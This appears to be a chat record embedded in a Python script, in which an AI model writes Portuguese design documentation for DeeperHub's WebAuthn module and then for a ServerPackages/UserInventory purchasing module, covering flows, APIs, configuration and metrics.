    7.  Frontend envia para API que leva a `WebAuthn.complete_authentication(user_id_ou_username, assertion_response)`.
    8.  Backend valida, e se ok, `DeeperHub.Auth` cria a sess√£o.

## üåä 5. Fluxos Importantes

### Fluxo de Registro de Nova Credencial WebAuthn

1.  **Frontend:** Solicita op√ß√µes de registro ao backend (`DeeperHub.WebAuthn.begin_registration`).
2.  **`WebAuthnService.begin_registration/3`:**
    *   Gera um `challenge` aleat√≥rio e seguro.
    *   Armazena o `challenge` e `user_id` no cache (associado a uma sess√£o tempor√°ria ou ID de transa√ß√£o) com TTL curto.
    *   Constr√≥i `PublicKeyCredentialCreationOptions` incluindo:
        *   `rp`: ID e nome da Relying Party (DeeperHub).
        *   `user`: ID, nome e displayName do usu√°rio DeeperHub.
        *   `challenge`: O challenge gerado.
        *   `pubKeyCredParams`: Algoritmos de chave p√∫blica suportados (ex: ES256, RS256).
        *   `authenticatorSelection`: Requisitos do autenticador (ex: `userVerification: \"preferred\"`).
        *   `attestation`: Prefer√™ncia de atesta√ß√£o (ex: `\"none\"` ou `\"indirect\"`).
        *   `excludeCredentials`: Lista de `credential_id`s que o usu√°rio j√° registrou para este RP (evita re-registro).
    *   Retorna as op√ß√µes para o frontend.
3.  **Frontend:** Chama `navigator.credentials.create(optionsFromBackend)`.
4.  **Navegador/Autenticador:** Usu√°rio interage com o autenticador. O autenticador gera um novo par de chaves, assina o challenge (e outros dados) com a chave privada, e retorna a chave p√∫blica e a atesta√ß√£o.
5.  **Frontend:** Envia a `PublicKeyCredential` (com a `attestationResponse`) para o backend (`DeeperHub.WebAuthn.complete_registration`).
6.  **`WebAuthnService.complete_registration/2`:**
    *   Recupera o `challenge` original do cache usando o ID de sess√£o/transa√ß√£o.
    *   **Usa a biblioteca WebAuthn para:**
        *   Parsear a `attestationResponse` (CBOR).
        *   Verificar a origem (origin).
        *   Verificar se o challenge na resposta corresponde ao challenge armazenado.
        *   Verificar a assinatura da atesta√ß√£o (se o tipo de atesta√ß√£o n√£o for \"none\").
        *   Extrair a `credential_id`, `public_key` (COSE) e `sign_count` inicial (geralmente 0).
    *   Se todas as valida√ß√µes passarem:
        *   Cria e salva uma nova `CredentialSchema` no banco de dados com `user_id`, `credential_id`, `public_key`, `sign_count`, `transports`.
        *   Limpa o challenge do cache.
        *   Retorna `{:ok, credential_struct}`.
    *   Se falhar, retorna erro.

*(O fluxo de autentica√ß√£o √© similar, mas usa `begin_authentication` para obter um challenge e `complete_authentication` para verificar uma asser√ß√£o, que envolve verificar a assinatura usando a chave p√∫blica armazenada e o `sign_count`.)*

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.WebAuthn`)

*(Baseado na documenta√ß√£o original e refinando)*

### 6.1. `DeeperHub.WebAuthn.begin_registration(user_id :: String.t(), user_display_name :: String.t(), opts :: keyword()) :: {:ok, PublicKeyCredentialCreationOptions.t()} | {:error, term()}`

*   **Descri√ß√£o:** Inicia o processo de registro de uma nova credencial WebAuthn.
*   **`opts`:**
    *   `:key_name` (String.t): Nome amig√°vel para a credencial.
    *   `:authenticator_selection` (map): Crit√©rios para sele√ß√£o do autenticador (ex: `%{userVerification: \"preferred\", authenticatorAttachment: \"cross-platform\"}`).
    *   `:attestation_preference` (atom): `:none`, `:indirect`, `:direct`.
*   **`PublicKeyCredentialCreationOptions.t()`:** Um mapa que pode ser serializado para JSON e passado para `navigator.credentials.create()`.

### 6.2. `DeeperHub.WebAuthn.complete_registration(user_id :: String.t(), attestation_response_from_client :: map()) :: {:ok, CredentialSchema.t()} | {:error, term()}`

*   **Descri√ß√£o:** Completa o registro de uma credencial WebAuthn usando a resposta do autenticador.
*   **`attestation_response_from_client`:** O objeto `PublicKeyCredential` (geralmente como um mapa decodificado de JSON) retornado por `navigator.credentials.create()`.
*   **Retorno de Erro:** `:invalid_challenge`, `:invalid_origin`, `:invalid_signature`, `:credential_already_registered`, etc.

### 6.3. `DeeperHub.WebAuthn.begin_authentication(user_identifier :: String.t(), opts :: keyword()) :: {:ok, PublicKeyCredentialRequestOptions.t()} | {:error, :user_not_found | :no_credentials_for_user | term()}`

*   **Descri√ß√£o:** Inicia o processo de autentica√ß√£o WebAuthn para um usu√°rio (identificado por ID ou username).
*   **`opts`:**
    *   `:user_verification` (atom): `:required`, `:preferred`, `:discouraged`.
*   **`PublicKeyCredentialRequestOptions.t()`:** Um mapa para ser passado para `navigator.credentials.get()`. Inclui um `challenge` e, opcionalmente, `allowCredentials`.

### 6.4. `DeeperHub.WebAuthn.complete_authentication(user_identifier :: String.t(), assertion_response_from_client :: map()) :: {:ok, %{user_id: String.t(), credential_id: String.t()}} | {:error, term()}`

*   **Descri√ß√£o:** Completa a autentica√ß√£o WebAuthn usando a resposta do autenticador.
*   **Retorno de Erro:** `:invalid_challenge`, `:invalid_origin`, `:invalid_signature`, `:credential_not_found`, `:sign_count_error`.

### 6.5. `DeeperHub.WebAuthn.list_credentials(user_id :: String.t()) :: {:ok, list(CredentialSchema.t())}`

*   **Descri√ß√£o:** Lista todas as credenciais WebAuthn registradas para um usu√°rio.

### 6.6. `DeeperHub.WebAuthn.remove_credential(user_id :: String.t(), credential_id_to_remove :: String.t()) :: :ok | {:error, :not_found | :unauthorized}`

*   **Descri√ß√£o:** Remove uma credencial WebAuthn espec√≠fica de um usu√°rio. Requer que o `user_id` seja o propriet√°rio.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:web_authn, :enabled]`** (Boolean): Habilita/desabilita WebAuthn globalmente. (Padr√£o: `true`)
*   **`[:web_authn, :relying_party, :id]`** (String): O ID da Relying Party (geralmente o dom√≠nio do site, ex: `\"deeperhub.com\"`). **Obrigat√≥rio.**
*   **`[:web_authn, :relying_party, :name]`** (String): Nome amig√°vel da Relying Party (ex: \"DeeperHub\"). **Obrigat√≥rio.**
*   **`[:web_authn, :relying_party, :origins]`** (List de Strings): Lista de origens permitidas para as respostas WebAuthn (ex: `[\"https://app.deeperhub.com\", \"https://www.deeperhub.com\"]`). **Obrigat√≥rio e Cr√≠tico para Seguran√ßa.**
*   **`[:web_authn, :challenge_ttl_seconds]`** (Integer): Tempo de vida para os challenges armazenados no cache. (Padr√£o: `300` - 5 minutos)
*   **`[:web_authn, :default_user_verification]`** (Atom): Configura√ß√£o padr√£o para `userVerification` em `authenticatorSelection` (ex: `:preferred`).
*   **`[:web_authn, :default_attestation_preference]`** (Atom): Prefer√™ncia de atesta√ß√£o padr√£o (ex: `:none`).
*   **`[:web_authn, :supported_pub_key_cred_params_alg]`** (List de Integers): Algoritmos de chave p√∫blica suportados (ex: `[-7, -257]` para ES256 e RS256).
*   **`[:web_authn, :allow_untrusted_attestation]`** (Boolean): Se permite atesta√ß√µes de fontes n√£o confi√°veis (para depura√ß√£o, geralmente `false` em produ√ß√£o).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`: ConfigManager, Logger, Metrics, Repo, Cache.
*   `DeeperHub.Accounts`: Para associar credenciais a `user_id`.
*   `DeeperHub.Auth` e `DeeperHub.MFA`: Para integrar nos fluxos de login e MFA.
*   `DeeperHub.Audit`: Para registrar eventos de gerenciamento de credenciais.
*   `DeeperHub.Core.EncryptionService`: Se algum metadado da credencial precisar ser criptografado (a chave p√∫blica em si n√£o √© secreta).

### 8.2. Bibliotecas Externas

*   Uma biblioteca Elixir WebAuthn/FIDO2 (ex: `Wax`, `Webauthnix`) √© **altamente recomendada** devido √† complexidade do protocolo.
*   `Jason` (ou similar) para decodificar as respostas JSON do cliente.
*   Biblioteca para manipula√ß√£o de CBOR (geralmente inclu√≠da ou usada pela biblioteca WebAuthn).

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Fluxo de Registro de Usu√°rio (`DeeperHub.Accounts`):** Ap√≥s o registro inicial (ex: com email), oferecer ao usu√°rio a op√ß√£o de adicionar WebAuthn como m√©todo de login ou MFA.
*   **Fluxo de Login (`DeeperHub.Auth`):**
    *   Permitir que o usu√°rio inicie o login via WebAuthn (login sem senha). O frontend chama `WebAuthn.begin_authentication(username)`, e o backend retorna o challenge.
    *   Se usado como segundo fator, `AuthService` (ap√≥s valida√ß√£o da senha) chama `MFA.start_authentication(user_id, :webauthn)`, que por sua vez usa `WebAuthn.begin_authentication`.
*   **Configura√ß√µes de Seguran√ßa do Perfil do Usu√°rio:** UI para listar (`list_credentials`) e remover (`remove_credential`) chaves de seguran√ßa.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o fluxo completo de registro de credencial com diferentes tipos de autenticadores (mockeados ou reais, se poss√≠vel em ambiente de teste).
*   Testar o fluxo completo de autentica√ß√£o.
*   Testar a valida√ß√£o de challenges, origens, assinaturas e contadores de assinatura.
*   Testar a listagem e remo√ß√£o de credenciais.
*   Testar cen√°rios de erro (challenge expirado, credencial n√£o encontrada, etc.).
*   Localiza√ß√£o: `test/deeper_hub/web_authn/`.

### 10.2. M√©tricas

*   `deeper_hub.web_authn.registration.attempts.count` (tags: `status` (`success`, `failure`))
*   `deeper_hub.web_authn.registration.duration_ms` (Histograma)
*   `deeper_hub.web_authn.authentication.attempts.count` (tags: `status` (`success`, `failure`))
*   `deeper_hub.web_authn.authentication.duration_ms` (Histograma)
*   `deeper_hub.web_authn.credentials.registered.gauge` (Gauge)
*   `deeper_hub.web_authn.credentials.removed.count`

### 10.3. Logs

*   **N√≠vel INFO:** Registro/autentica√ß√£o bem-sucedida. Credencial removida.
*   **N√≠vel WARNING:** Falha na valida√ß√£o de atesta√ß√£o/asser√ß√£o com detalhes do motivo (ex: challenge inv√°lido, assinatura incorreta, contador de assinatura inv√°lido).
*   **N√≠vel ERROR:** Erro cr√≠tico na biblioteca WebAuthn ou falha ao persistir credencial.

### 10.4. Telemetria

*   `[:deeper_hub, :web_authn, :registration, :begin | :complete, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, rp_id: id}`
    *   No `complete_stop`: `%{credential_id: id, result: :success | :failure, error_reason: reason}`
*   `[:deeper_hub, :web_authn, :authentication, :begin | :complete, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, rp_id: id}`
    *   No `complete_stop`: `%{credential_id: id, result: :success | :failure, error_reason: reason}`
*   `[:deeper_hub, :web_authn, :credential, :removed]`
    *   Metadados: `%{user_id: id, credential_id: id}`

## ‚ùå 11. Tratamento de Erros

*   Falhas de valida√ß√£o durante `complete_registration` ou `complete_authentication` devem retornar erros claros para o frontend para que o usu√°rio possa ser informado.
*   Erros no armazenamento de challenges tempor√°rios devem ser tratados (ex: solicitar que o usu√°rio reinicie o fluxo).

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Valida√ß√£o da Relying Party ID e Origin:** Crucial para prevenir ataques de phishing e garantir que as credenciais sejam usadas apenas no site correto.
*   **Prote√ß√£o contra Replay:** O uso de challenges √∫nicos para cada opera√ß√£o previne ataques de replay.
*   **Contador de Assinatura:** Fundamental para detectar clonagem de autenticadores.
*   **Armazenamento da Chave P√∫blica:** A chave p√∫blica n√£o √© secreta, mas sua integridade deve ser garantida.
*   **Transportes Seguros:** Garantir que a comunica√ß√£o entre cliente e servidor seja sempre sobre HTTPS.
*   **User Presence vs. User Verification:** `userVerification` (\"required\", \"preferred\", \"discouraged\") na sele√ß√£o do autenticador determina se o autenticador deve verificar o usu√°rio (ex: biometria no autenticador). `userPresence` (geralmente impl√≠cito) garante que o usu√°rio estava presente (ex: tocou na chave).

## üßë‚Äçüíª 13. Contribui√ß√£o

*   A integra√ß√£o com bibliotecas WebAuthn requer um bom entendimento das especifica√ß√µes FIDO2/WebAuthn.
*   O fluxo no frontend (JavaScript) √© uma parte significativa da implementa√ß√£o.
*   Manter as configura√ß√µes da Relying Party (ID, origins) corretas e seguras.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Suporte para \"Resident Keys\" / \"Discoverable Credentials\" (permite login sem precisar digitar o username primeiro, o autenticador fornece a identidade).
*   [ ] Interface de usu√°rio mais amig√°vel para gerenciamento de m√∫ltiplos autenticadores.
*   [ ] Pol√≠ticas mais granulares para quando WebAuthn pode ser usado como √∫nico fator vs. como segundo fator.
*   [ ] Melhorar o tratamento de diferentes tipos de atesta√ß√£o (se a pol√≠tica da RP exigir valida√ß√£o de atesta√ß√£o mais forte que \"none\").
*   [ ] Permitir que usu√°rios exportem/importem metadados de credenciais para backup (com muitas ressalvas de seguran√ßa).
*   [ ] Monitoramento proativo de revoga√ß√£o de certificados raiz de atesta√ß√£o (para tipos de atesta√ß√£o mais fortes).

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

WebAuthn √© uma tecnologia poderosa para o futuro da autentica√ß√£o!

Com este, cobrimos os principais m√©todos de autentica√ß√£o. Que tal agora irmos para um m√≥dulo de dom√≠nio que ainda n√£o foi detalhado, como `DeeperHub.ServerPackages` ou `DeeperHub.Support` (que j√° fizemos)? Ou talvez o `DeeperHub.Console`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""J√° detalhamos o `DeeperHub.Support`.

Vamos ent√£o para o `DeeperHub.ServerPackages`. Este m√≥dulo lida com a monetiza√ß√£o ou ofertas de valor agregado que os servidores podem disponibilizar aos seus jogadores.

---

# M√≥dulo: `DeeperHub.ServerPackages` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.ServerPackages`

O m√≥dulo `DeeperHub.ServerPackages` √© respons√°vel por gerenciar **pacotes, itens ou assinaturas (packages)** que os propriet√°rios de servidores podem oferecer aos jogadores na plataforma DeeperHub. Estes pacotes podem representar uma variedade de ofertas, como acesso VIP, moedas virtuais espec√≠ficas do servidor, itens no jogo, cosm√©ticos, ou outros benef√≠cios e produtos digitais.

Este m√≥dulo lida com:
*   A defini√ß√£o, cria√ß√£o e gerenciamento de pacotes pelos propriet√°rios de servidores.
*   A listagem de pacotes dispon√≠veis para um servidor.
*   A l√≥gica de \"aquisi√ß√£o\" ou \"compra\" desses pacotes, que pode envolver integra√ß√£o com sistemas de pagamento ou moedas virtuais da plataforma.
*   A concess√£o dos benef√≠cios do pacote ao usu√°rio ap√≥s a aquisi√ß√£o.

O objetivo √© fornecer uma maneira estruturada e gerenci√°vel para os servidores oferecerem valor adicional ou monetizarem suas comunidades dentro do ecossistema DeeperHub. üòä

*(Nota: Na documenta√ß√£o original, este era `DeeperHub.Services.ServerPackages`. Ser√° tratado como `DeeperHub.ServerPackages`.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento CRUD de Defini√ß√µes de Pacotes (`create_server_package/1`, `get_server_package/1`, `update_server_package/2`, `delete_server_package/1`):**
    *   Permitir que propriet√°rios de servidores (ou administradores com permiss√£o) criem, visualizem, atualizem e excluam defini√ß√µes de pacotes associados aos seus servidores.
    *   Cada defini√ß√£o de pacote inclui: nome, descri√ß√£o detalhada, pre√ßo (com moeda ‚Äì real ou virtual), tipo de pacote (ex: compra √∫nica, assinatura mensal), dura√ß√£o (se assinatura), lista de benef√≠cios/itens inclu√≠dos (pode ser um campo JSONB flex√≠vel para descrever os efeitos), imagem/√≠cone, status (ativo, inativo, rascunho), datas de disponibilidade (opcional).
*   **Listagem de Pacotes:**
    *   Listar todos os pacotes ativos e dispon√≠veis para um servidor espec√≠fico (`list_server_packages_by_server/2`).
    *   Listar todos os pacotes dispon√≠veis na plataforma com filtros (ex: por tipo de servidor, por tipo de pacote, por faixa de pre√ßo) (`list_all_server_packages/1`).
    *   Suporte a pagina√ß√£o e ordena√ß√£o.
*   **Processo de Aquisi√ß√£o de Pacote (Coordena√ß√£o):**
    *   Fornecer uma API para iniciar o processo de aquisi√ß√£o de um pacote por um usu√°rio (`acquire_package/3` - esta fun√ß√£o pode residir em um `UserPackageService` ou `UserInventoryService` que coordena com `ServerPackages` e `Payments`).
    *   Verificar elegibilidade do usu√°rio para adquirir o pacote (ex: limites de compra, pr√©-requisitos).
*   **Integra√ß√£o com Pagamentos (`DeeperHub.Payments`):**
    *   Se o pacote tiver um pre√ßo em moeda real, integrar com o sistema de pagamentos para processar a transa√ß√£o antes de conceder o pacote.
*   **Integra√ß√£o com Moeda Virtual/Pontos (`DeeperHub.PointsService` ou similar):**
    *   Se o pacote for adquirido com moeda virtual da plataforma, integrar com o servi√ßo correspondente para debitar o saldo do usu√°rio.
*   **Concess√£o de Benef√≠cios/Itens (`grant_package_benefits/3`):**
    *   Ap√≥s a aquisi√ß√£o bem-sucedida, acionar a l√≥gica para conceder os benef√≠cios ou itens do pacote ao usu√°rio. Isso pode envolver:
        *   Chamar APIs do servidor de jogo (se o DeeperHub tiver essa capacidade de integra√ß√£o).
        *   Atualizar o estado do usu√°rio no `DeeperHub.Accounts` (ex: marcar como VIP).
        *   Adicionar itens a um `DeeperHub.UserInventoryService` (Novo Sugerido).
        *   Conceder pap√©is/permiss√µes espec√≠ficas (via `DeeperHub.RBAC`).
*   **Gerenciamento de Assinaturas (se aplic√°vel):**
    *   Lidar com a l√≥gica de renova√ß√£o, cancelamento e status de pacotes do tipo assinatura. (Isso pode ser complexo e exigir um subm√≥dulo ou integra√ß√£o com um servi√ßo de faturamento recorrente).
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a cria√ß√£o, aquisi√ß√£o e concess√£o de pacotes.
    *   Publicar eventos de dom√≠nio (ex: `server_package.created`, `user.package_acquired`) no `Core.EventBus`.
    *   Auditar todas as transa√ß√µes e modifica√ß√µes de pacotes.
*   **Caching:**
    *   Cachear defini√ß√µes de pacotes para acesso r√°pido.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerPackages` (Fachada P√∫blica):**
    *   Ponto de entrada para gerenciamento de defini√ß√µes de pacotes e consulta.
    *   Delega para o `ServerPackagesService`.
2.  **`DeeperHub.ServerPackages.Services.ServerPackagesService` (ou `DefaultServerPackagesService`):**
    *   **Responsabilidade:** L√≥gica de neg√≥cio para CRUD de `ServerPackageSchema`.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para persist√™ncia.
        *   `DeeperHub.Servers`: Para validar `server_id`.
        *   `DeeperHub.Accounts`: Para `user_id` do criador.
        *   `DeeperHub.Auth`/`RBAC`: Para permiss√µes de gerenciamento.
        *   `DeeperHub.Core.EventBus`, `Core.Cache`, `Core.ConfigManager`.
3.  **`DeeperHub.ServerPackages.Schemas.ServerPackageSchema`:**
    *   Define a estrutura de um pacote oferecido por um servidor.
    *   Campos: `id`, `server_id`, `name`, `description`, `image_url`, `package_type` (`:one_time`, `:subscription`), `price_currency` (ex: \"BRL\", \"USD\", \"POINTS_PLATFORM\", \"CREDITS_SERVER_X\"), `price_amount` (Decimal), `duration_days` (para assinaturas), `benefits_payload` (JSONB, descrevendo o que √© concedido, ex: `%{ \"role\": \"VIP_GOLD\", \"ingame_items\": [{\"id\": \"sword123\", \"qty\": 1}], \"virtual_currency\": {\"type\": \"gems\", \"amount\": 500} }`), `is_active`, `available_from`, `available_until`, `max_per_user`, `sort_order`.
4.  **`DeeperHub.UserInventory` (ou `UserPackages` - Novo M√≥dulo Sugerido):**
    *   **Fachada (`DeeperHub.UserInventory`):** Para opera√ß√µes como `acquire_package`, `list_my_packages`.
    *   **Servi√ßo (`UserInventoryService`):** Orquestra a aquisi√ß√£o, incluindo intera√ß√£o com `Payments`/`PointsService` e `ServerPackages` para obter detalhes do pacote, e ent√£o `GrantingService` para aplicar os benef√≠cios.
    *   **Schema (`UserPackageInstanceSchema`):** Registra que um `user_id` adquiriu um `server_package_id`, com `acquired_at`, `expires_at` (para assinaturas), `status` (`:active`, `:expired`, `:cancelled`).
5.  **`DeeperHub.GrantingService` (Novo M√≥dulo Sugerido ou parte do `UserInventory`):**
    *   **Responsabilidade:** Interpretar o `benefits_payload` de um `ServerPackage` e aplicar os benef√≠cios ao usu√°rio. Isso pode envolver chamar APIs de jogos, atualizar `UserSchema` ou `UserRoleSchema`, adicionar itens a um invent√°rio virtual, etc. Pode usar um sistema de \"handlers de benef√≠cio\" similar aos `RewardHandler`s.
6.  **`DeeperHub.Payments` (M√≥dulo Separado):**
    *   Se houver pagamento com moeda real.
7.  **`DeeperHub.ServerPackages.Storage` / `UserInventory.Storage`:**
    *   Encapsulam queries Ecto.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/server_packages/
‚îú‚îÄ‚îÄ server_packages.ex                # Fachada para defini√ß√µes de pacotes
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ server_packages_service.ex    # CRUD para ServerPackageSchema
‚îÇ
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îî‚îÄ‚îÄ server_package_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional)
‚îú‚îÄ‚îÄ cached_adapter.ex                 # (Opcional, para defini√ß√µes)
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex

lib/deeper_hub/user_inventory/        # NOVO M√ìDULO para gerenciar o que os usu√°rios possuem
‚îú‚îÄ‚îÄ user_inventory.ex                 # Fachada (ex: acquire_package)
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ user_inventory_service.ex     # Orquestra aquisi√ß√£o
‚îÇ   ‚îî‚îÄ‚îÄ granting_service.ex           # Aplica benef√≠cios
‚îÇ
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îî‚îÄ‚îÄ user_package_instance_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Separa√ß√£o de Defini√ß√£o e Inst√¢ncia:** Manter `ServerPackageSchema` (o que est√° √† venda) separado de `UserPackageInstanceSchema` (o que o usu√°rio comprou) √© crucial.
*   **Flexibilidade dos Benef√≠cios:** O `benefits_payload` em JSONB √© chave para suportar diversos tipos de benef√≠cios sem alterar o schema do banco de dados constantemente.
*   **Transacionalidade da Aquisi√ß√£o:** O processo de debitar fundos (reais ou virtuais) e conceder o pacote/benef√≠cios deve ser at√¥mico.
*   **L√≥gica de Concess√£o:** A l√≥gica de como os benef√≠cios s√£o aplicados (`GrantingService`) pode ser complexa e precisar de integra√ß√µes com sistemas externos (APIs de jogos).

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Propriet√°rio de Servidor Adiciona um Pacote \"Kit Inicial\":**
    *   Define nome, descri√ß√£o, pre√ßo (ex: 500 \"Pontos da Plataforma\"), e `benefits_payload: %{\"ingame_items\": [{\"item_id\": \"basic_sword\", \"qty\": 1}, {\"item_id\": \"healing_potion\", \"qty\": 5}]}`.
    *   API chama `ServerPackages.create_server_package(...)`.
*   **Jogador Compra o \"Kit Inicial\":**
    *   UI mostra o pacote. Jogador clica em \"Comprar com 500 Pontos\".
    *   API chama `UserInventory.acquire_package(user_id, package_id, %{payment_method: :platform_points})`.
    *   `UserInventoryService` verifica e debita os pontos do `PointsService`.
    *   Cria `UserPackageInstanceSchema`.
    *   `GrantingService` interpreta o `benefits_payload` e (por exemplo) chama uma API do servidor de jogo para dar os itens ao jogador.
*   **Sistema Verifica Assinatura VIP de um Jogador:**
    *   Quando o jogador loga no servidor de jogo, o jogo pode consultar uma API do DeeperHub: `UserInventory.get_active_package_instance_by_type(user_id, server_id, :vip_subscription)`.

## üåä 5. Fluxos Importantes

### Fluxo de Compra de um Pacote de \"Uso √önico\" com Moeda Virtual

1.  **Usu√°rio (UI):** Clica para comprar Pacote P (ID: `pkg_123`) que custa 100 Pontos.
2.  **Controller API:** Chama `DeeperHub.UserInventory.acquire_package(user_id, \"pkg_123\", %{payment_method: :platform_points, expected_points_cost: 100})`.
3.  **`UserInventoryService.acquire_package/3`:**
    *   Busca `ServerPackageSchema` para \"pkg_123\" (via `ServerPackages.get_server_package`). Verifica se est√° ativo e o pre√ßo.
    *   Verifica se o usu√°rio j√° atingiu `max_per_user` para este pacote, se aplic√°vel.
    *   Chama `DeeperHub.PointsService.debit_points(user_id, 100, %{reason: \"Purchase of pkg_123\"})`.
    *   **Se d√©bito falhar (saldo insuficiente):** Retorna `{:error, :insufficient_points}`.
    *   **Se d√©bito OK:**
        *   Inicia uma transa√ß√£o `Core.Repo.transaction/2`.
        *   Dentro da transa√ß√£o:
            *   Cria um `UserPackageInstanceSchema` (`user_id`, `server_package_id`, `acquired_at`, `status: :active` (ou `:consumed` se o efeito √© imediato e √∫nico)).
            *   Incrementa `total_purchased_count` no `ServerPackageSchema`.
        *   **Fim da transa√ß√£o.**
        *   Se a transa√ß√£o do Repo falhar, tenta reverter o d√©bito de pontos (l√≥gica de compensa√ß√£o ou saga pode ser necess√°ria aqui, ou a transa√ß√£o de pontos deve fazer parte da transa√ß√£o do Repo se o PointsService usar o mesmo DB).
        *   Se tudo OK:
            *   Chama `GrantingService.apply_benefits(user_id, server_package.benefits_payload, %{source_package_instance_id: ...})`.
            *   Publica evento `user_package.acquired` no `Core.EventBus`.
            *   Notifica o usu√°rio.
            *   Retorna `{:ok, user_package_instance}`.

## üì° 6. API (Fun√ß√µes P√∫blicas das Fachadas)

### `DeeperHub.ServerPackages` (Gerenciamento de Defini√ß√µes)

*   `create_server_package(creator_user_id, server_id, attrs)`
*   `update_server_package(package_id, attrs, current_user_id)`
*   `delete_server_package(package_id, current_user_id)`
*   `get_server_package(package_id)`
*   `list_server_packages_by_server(server_id, opts)`
*   `list_all_server_packages(filters, opts)`

### `DeeperHub.UserInventory` (Aquisi√ß√£o e Gerenciamento de Inst√¢ncias de Usu√°rio)

*   **`DeeperHub.UserInventory.acquire_package(user_id :: String.t(), server_package_id :: String.t(), acquisition_context :: map()) :: {:ok, UserPackageInstance.t()} | {:error, term()}`**
    *   `acquisition_context`: `%{payment_method: :platform_points | :real_money_transaction_id, expected_cost: Decimal.t() | nil}`.
*   **`DeeperHub.UserInventory.list_my_active_packages(user_id :: String.t(), opts :: keyword()) :: {:ok, list(UserPackageInstanceView.t())}`**
    *   `UserPackageInstanceView.t()`: Combina dados da inst√¢ncia com a defini√ß√£o do pacote.
*   **`DeeperHub.UserInventory.get_package_instance_details(user_package_instance_id :: String.t(), user_id :: String.t()) :: {:ok, UserPackageInstanceView.t() | nil}`**
*   **`DeeperHub.UserInventory.cancel_subscription(user_package_instance_id :: String.t(), user_id :: String.t()) :: :ok | {:error, term()}`** (Se houver assinaturas)

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_packages, :enabled]`** (Boolean).
*   **`[:server_packages, :max_name_length]`** (Integer).
*   **`[:server_packages, :max_description_length]`** (Integer).
*   **`[:server_packages, :allowed_currencies]`** (List de Strings): Ex: `[\"POINTS_PLATFORM\", \"USD\"]`.
*   **`[:server_packages, :default_package_types]`** (List de Atoms): Ex: `[:one_time, :subscription]`.
*   **`[:server_packages, :cache, :package_definition_ttl_seconds]`** (Integer).
*   **`[:user_inventory, :default_subscription_renewal_notification_days_before]`** (Integer): Para enviar lembretes de renova√ß√£o.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`.
*   `DeeperHub.Servers`: Para `server_id`.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Auth`/`RBAC`: Para permiss√µes.
*   `DeeperHub.Notifications`: Para notificar sobre aquisi√ß√µes.
*   `DeeperHub.Payments` (Opcional).
*   `DeeperHub.PointsService` (ou similar, Opcional).
*   `DeeperHub.Audit`.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   `Decimal`.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **UI do Propriet√°rio do Servidor:** Para definir e gerenciar os pacotes que seu servidor oferece.
*   **Loja na P√°gina do Servidor (UI do Jogador):** Para listar pacotes e iniciar o fluxo de aquisi√ß√£o.
*   **Servidor de Jogo (Externo):** Pode precisar de uma API para:
    *   Verificar os pacotes/benef√≠cios ativos de um jogador (via `UserInventory`).
    *   (Potencialmente) Conceder itens/benef√≠cios no jogo ap√≥s o `GrantingService` ser notificado (ex: via webhook ou API do jogo).

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `ServerPackageSchema`.
*   Testar o fluxo completo de aquisi√ß√£o de pacotes com diferentes m√©todos de pagamento (mockados).
*   Testar a correta concess√£o de benef√≠cios pelo `GrantingService` (com mocks para sistemas externos).
*   Testar a l√≥gica de assinaturas (cria√ß√£o, renova√ß√£o, cancelamento, expira√ß√£o).
*   Testar limites (ex: `max_per_user`).
*   Localiza√ß√£o: `test/deeper_hub/server_packages/` e `test/deeper_hub/user_inventory/`.

### 10.2. M√©tricas

*   `deeper_hub.server_packages.definitions.count` (Gauge, tags: `server_id`)
*   `deeper_hub.user_inventory.package_acquired.count` (tags: `package_id`, `server_id`, `payment_method`)
*   `deeper_hub.user_inventory.revenue_generated.sum` (Contador, tags: `currency`, `package_id`) (Para moeda real)
*   `deeper_hub.user_inventory.points_spent.sum` (Contador, tags: `package_id`) (Para moeda virtual)
*   `deeper_hub.user_inventory.active_subscriptions.gauge` (tags: `package_id`)

### 10.3. Logs

*   **N√≠vel INFO:** Defini√ß√£o de pacote criada/atualizada. Pacote adquirido por usu√°rio. Benef√≠cios concedidos.
*   **N√≠vel WARNING:** Tentativa de adquirir pacote sem saldo/meio de pagamento v√°lido. Falha na concess√£o de um benef√≠cio espec√≠fico (com retry se aplic√°vel).
